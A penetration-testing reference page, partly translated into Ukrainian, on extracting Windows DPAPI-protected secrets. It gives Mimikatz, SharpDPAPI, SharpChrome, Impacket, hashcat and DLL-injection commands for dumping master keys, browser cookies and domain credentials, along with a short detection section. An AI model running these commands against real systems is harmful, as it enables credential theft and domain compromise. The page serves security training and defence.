# DPAPI - Витяг паролів

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **симетричного шифрування асиметричних приватних ключів**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Генерація ключів користувача

The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. This key is derived from the user's password and other factors and the algorithm depends on the type of user but ends being a SHA1. For example, for domain users, **it depends on the NTLM hash of the user**.

This is specially interesting because if an attacker can obtain the user's password hash, they can:

- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
- Try to **crack the password** offline trying to generate the valid DPAPI key

Moreover, every time some data is encrypted by a user using DPAPI, a new **master key** is generated. This master key is the one actually used to encrypt data. Each master key is given with a **GUID** (Globally Unique Identifier) that identifies it.

The master keys are stored in the **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, where `{SID}` is the Security Identifier of that user. The master key is stored encrypted by the user's **`pre-key`** and also by a **domain backup key** for recovery (so the same key is stored encrypted 2 times by 2 different pass).

Note that the **domain key used to encrypt the master key is in the domain controllers and never changes**, so if an attacker has access to the domain controller, they can retrieve the domain backup key and decrypt the master keys of all users in the domain.

The encrypted blobs contain the **GUID of the master key** that was used to encrypt the data inside its headers.

> [!TIP]
> Зашифровані DPAPI бло́би починаються з **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ось як виглядає кілька Master Keys користувача:

![](<../../images/image (1121).png>)

### Генерація ключа Machine/System

Цей ключ використовується машиною для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret**, який є спеціальним ключем, доступ до якого має лише користувач SYSTEM. Цей ключ використовується для шифрування даних, до яких має отримувати доступ сама система, наприклад облікових даних на рівні машини або загальносистемних секретів.

Зауважте, що ці ключі **не мають доменного резервного копіювання**, тому вони доступні лише локально:

- **Mimikatz** може отримати до них доступ, витягнувши LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в реєстрі, тому адміністратор може **змінити дозволи DACL, щоб отримати до нього доступ**. Шлях у реєстрі: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Також можлива офлайн-екстракція з registry hives. Наприклад, як адміністратор на цільовій системі, збережіть hives та exfiltrate їх:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Потім на вашій машині для аналізу відновіть DPAPI_SYSTEM LSA секрет із hives і використайте його для розшифрування machine-scope blobs (паролі запланованих завдань, облікові дані сервісів, профілі Wi‑Fi тощо):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Дані, захищені DPAPI

Серед персональних даних, захищених DPAPI, є:

- облікові дані Windows
- паролі та дані автозаповнення Internet Explorer і Google Chrome
- паролі від e-mail і внутрішніх FTP-акаунтів для додатків, таких як Outlook і Windows Mail
- паролі для спільних папок, ресурсів, бездротових мереж і Windows Vault, включаючи ключі шифрування
- паролі для підключень Remote Desktop, .NET Passport і приватні ключі для різних цілей шифрування та автентифікації
- мережеві паролі, керовані Credential Manager, та персональні дані в додатках, що використовують CryptProtectData, таких як Skype, MSN messenger тощо
- зашифровані бінарні блоби в реєстрі
- ...

Системно захищені дані включають:
- паролі Wi‑Fi
- паролі для запланованих завдань
- ...

### Варіанти витягання master key

- Якщо користувач має domain admin privileges, він може отримати доступ до **domain backup key** для розшифрування всіх master keys користувачів у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Маючи локальні привілеї адміністратора, можна **отримати доступ до пам'яті LSASS** щоб витягти DPAPI master keys усіх підключених користувачів та ключ SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має local admin privileges, він може отримати доступ до **DPAPI_SYSTEM LSA secret** для дешифрування machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо відомий пароль користувача або його NTLM-хеш, ви можете **безпосередньо розшифрувати майстер-ключі користувача**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте в сесії як користувач, можна запитати DC про **backup key to decrypt the master keys using RPC**. Якщо ви local admin і користувач увійшов у систему, ви можете **steal his session token** для цього:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Знайти зашифровані дані DPAPI

Поширені **захищені файли** користувачів розташовані в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити DPAPI encrypted blobs у file system, registry та B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зверніть увагу, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того самого репозиторію) можна використовувати для розшифрування чутливих даних, таких як cookies, за допомогою DPAPI.

#### Chromium/Edge/Electron швидкі рецепти (SharpChrome)

- Поточний користувач, інтерактивне розшифрування збережених логінів/cookies (працює навіть з Chrome 127+ app-bound cookies, оскільки додатковий ключ отримується з Credential Manager користувача при запуску в контексті користувача):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Офлайн-аналіз, коли у вас є лише файли. Спочатку витягніть AES state key з профілю "Local State", а потім використайте його, щоб розшифрувати cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Доменний/віддалений тріаж, коли у вас є DPAPI domain backup key (PVK) та admin на цільовому хості:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Якщо у вас є DPAPI prekey/credkey користувача (from LSASS), ви можете пропустити password cracking і безпосередньо розшифрувати дані профілю:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Примітки
- Новіші збірки Chrome/Edge можуть зберігати певні cookies із використанням шифрування "App-Bound". Офлайн-розшифрування цих конкретних cookies неможливе без додаткового app-bound ключа; запустіть SharpChrome в контексті цільового користувача, щоб отримати його автоматично. Див. Chrome security blog post, наведений нижче.

### Ключі доступу та дані

- **Використовуйте SharpDPAPI** щоб отримати облікові дані з DPAPI-шифрованих файлів поточної сесії:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримати credentials info** такі як encrypted data та guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Доступ до masterkeys**:

Розшифрувати masterkey користувача, що запитує **domain backup key** за допомогою RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування masterkey (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password`, щоб використати пароль у відкритому вигляді, або `/pvk`, щоб вказати файл приватного ключа домену DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані, використовуючи masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для дешифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що можна використати /rpc для отримання ключа резервної копії домену, /password для використання пароля у відкритому вигляді, /pvk для вказівки файлу приватного ключа DPAPI домену, /unprotect для використання поточної сесії користувача...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Використання DPAPI prekey/credkey безпосередньо (пароль не потрібен)

Якщо ви можете dump LSASS, Mimikatz часто виявляє per-logon DPAPI key, який можна використати для розшифрування masterkeys користувача без знання plaintext password. Передайте це значення безпосередньо в tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Розшифрувати деякі дані, використовуючи **поточну сесію користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Офлайн дешифрування з Impacket dpapi.py

Якщо у вас є SID та пароль користувача-жертви (або NT hash), ви можете повністю офлайн дешифрувати DPAPI masterkeys та Credential Manager blobs за допомогою Impacket’s dpapi.py.

- Знайдіть артефакти на диску:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Відповідний masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Якщо інструменти передачі файлів працюють ненадійно, закодуйте файли base64 на хості та скопіюйте вивід:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decrypt the masterkey за допомогою SID користувача та password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Використайте розшифрований masterkey для розшифрування credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
This workflow often recovers domain credentials saved by apps using the Windows Credential Manager, including administrative accounts (e.g., `*_adm`).

---

### Обробка необов'язкової ентропії ("Third-party entropy")

Деякі додатки передають додаткове значення **entropy** в `CryptProtectData`. Без цього значення blob не може бути розшифрований, навіть якщо відомий правильний masterkey. Отримання ентропії тому є необхідним при націлюванні на облікові дані, захищені таким способом (наприклад, Microsoft Outlook, деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — user-mode DLL, який hooks функції DPAPI всередині цільового процесу і прозоро записує будь-яку надану необов'язкову ентропію. Запуск EntropyCapture у режимі **DLL-injection** проти процесів, таких як `outlook.exe` або `vpnclient.exe`, виведе файл, що відображає кожний буфер ентропії до викликаючого процесу та blob. Захоплену ентропію можна пізніше передати до SharpDPAPI (`/entropy:`) або Mimikatz (`/entropy:<file>`) для розшифрування даних.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Злам masterkeys офлайн (Hashcat & DPAPISnoop)

Microsoft представила формат **context 3** masterkey, починаючи з Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) додав hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) та **22102** (context 3), що дозволяють GPU-accelerated cracking паролів користувачів безпосередньо з файлу masterkey. Отже, нападники можуть виконувати word-list або brute-force атаки без взаємодії з цільовою системою.

`DPAPISnoop` (2024) автоматизує процес:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може розпарсити Credential and Vault blobs, розшифрувати їх за допомогою cracked keys і експортувати cleartext passwords.

### Доступ до даних іншої машини

У **SharpDPAPI and SharpChrome** можна вказати опцію **`/server:HOST`** для доступу до даних віддаленої машини. Звісно, вам потрібно мати доступ до тієї машини, і в наведеному нижче прикладі передбачається, що **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — це інструмент, який автоматизує витяг усіх користувачів та комп’ютерів з LDAP-каталогу та витяг ключа резервної копії контролера домену через RPC. Скрипт потім резолвить IP-адреси всіх комп’ютерів і виконує smbclient на всіх машинах, щоб отримати всі DPAPI-блоби всіх користувачів і розшифрувати все за допомогою доменного backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Зі списку комп’ютерів, витягнутого з LDAP, ви можете знайти кожну підмережу, навіть якщо раніше про неї не знали!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично дампити секрети, захищені DPAPI. Реліз 2.x ввів:

* Паралельний збір блобів з сотень хостів
* Парсинг masterkeys контексту **3** та автоматичну інтеграцію з Hashcat для підбору
* Підтримку Chrome "App-Bound" зашифрованих cookie (див. наступний розділ)
* Новий режим **`--snapshot`** для періодичного опитування кінцевих точок і дифу новостворених блобів

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — це C# парсер для masterkey/credential/vault файлів, який може виводити формати для Hashcat/JtR і опційно автоматично викликати cracking. Він повністю підтримує формати машинних і користувацьких masterkey аж до Windows 11 24H1.


## Поширені виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших DPAPI-пов’язаних директоріях.
- Особливо з мережевого шару, наприклад **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам’яті LSASS або дампу masterkey.
- Подія **4662**: *Виконано операцію над об'єктом* – може корелювати з доступом до об’єкта **`BCKUPKEY`**.
- Події **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Уразливості та зміни екосистеми 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023). Атакуючий з мережею доступом міг ввести в оману член домену, щоб той отримав шкідливий DPAPI backup key, що дозволяло розшифровувати user masterkeys. Виправлено в листопадовому кумулятивному оновленні 2023 — адміністраторам слід переконатися, що DC та робочі станції повністю пропатчені.
* **Chrome 127 “App-Bound” cookie encryption** (липень 2024) замінила застарілий захист лише DPAPI додатковим ключем, що зберігається під **Credential Manager** користувача. Офлайн-розшифровка cookie тепер вимагає як DPAPI masterkey, так і **GCM-wrapped app-bound key**. SharpChrome v2.3 та DonPAPI 2.x можуть відновити додатковий ключ, якщо виконуються в контексті користувача.


### Приклад: Zscaler Client Connector – власна ентропія, похідна від SID

Zscaler Client Connector зберігає кілька конфігураційних файлів у `C:\ProgramData\Zscaler` (наприклад, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожен файл зашифрований за допомогою **DPAPI (Machine scope)**, але постачальник додає **власну ентропію**, яка обчислюється під час виконання замість збереження на диску.

Ентропія відновлюється з двох елементів:

1. Вбудований у `ZSACredentialProvider.dll` жорстко закодований секрет.
2. **SID** облікового запису Windows, якому належить конфігурація.

Алгоритм, реалізований у DLL, еквівалентний:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудований у DLL, яку можна прочитати з диска, **будь-який локальний нападник з правами SYSTEM може заново згенерувати ентропію для будь-якого SID** і розшифрувати blobs офлайн:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування дає повну JSON-конфігурацію, включно з кожною **перевіркою стану пристрою** та її очікуваним значенням – інформація, яка є дуже цінною при спробах обходу на стороні клієнта.

> ПОРАДА: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені DPAPI **без** entropy (`16` нульових байтів). Тому їх можна безпосередньо розшифрувати за допомогою `ProtectedData.Unprotect`, як тільки будуть отримані привілеї SYSTEM.

## Джерела

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
